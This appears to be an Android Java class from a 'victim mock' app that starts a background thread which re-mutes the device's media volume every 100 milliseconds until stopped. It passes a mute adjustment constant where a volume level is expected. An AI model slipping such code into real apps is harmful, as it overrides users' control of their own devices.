package com.qstpss.victimmockapplication.mocks;

import android.content.Context;
import android.media.AudioManager;

public enum MuteMedia implements Mock {
    MOCK;

    private volatile boolean isStarted;

    @Override
    public void startMock(Context context) {
        stopMock();
        isStarted = true;
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        new Thread(() -> {
            while (isStarted) {
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    //it never happens
                }
            }
        }).start();
    }

    @Override
    public void stopMock() {
        if (isStarted) {
            isStarted = false;
        }
    }
}
